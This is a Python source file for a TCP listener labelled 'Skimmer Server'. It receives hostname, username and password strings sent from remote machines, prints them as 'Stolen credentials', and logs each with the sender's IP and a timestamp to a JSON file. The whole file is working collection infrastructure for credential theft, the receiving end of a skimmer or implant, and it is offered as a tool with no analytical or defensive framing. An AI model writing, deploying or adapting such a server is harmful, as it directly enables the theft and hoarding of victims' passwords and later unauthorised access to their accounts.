import socket
import json
from datetime import datetime

HOST = '0.0.0.0'
PORT = 9999
CREDS_FILE = 'creds.json'

def save_cred(ip, line):
    try:
        with open(CREDS_FILE, 'r') as f:
            data = json.load(f)
    except:
        data = []

    # Parse hostname:username:password format
    parts = line.strip().split(':', 2)
    if len(parts) == 3:
        hostname, user, passwd = parts
    else:
        # Fallback for old format (username:password)
        hostname = "unknown"
        user, passwd = line.strip().split(':', 1)
    
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "ip": ip,
        "hostname": hostname,
        "username": user,
        "password": passwd
    }

    data.append(entry)

    with open(CREDS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def main():
    print(f"[+] Skimmer Server listening on {HOST}:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            with conn:
                ip = addr[0]
                data = conn.recv(1024).decode()
                if data:
                    print(f"[!] Stolen credentials from {ip}: {data.strip()}")
                    save_cred(ip, data)

if __name__ == "__main__":
    main()
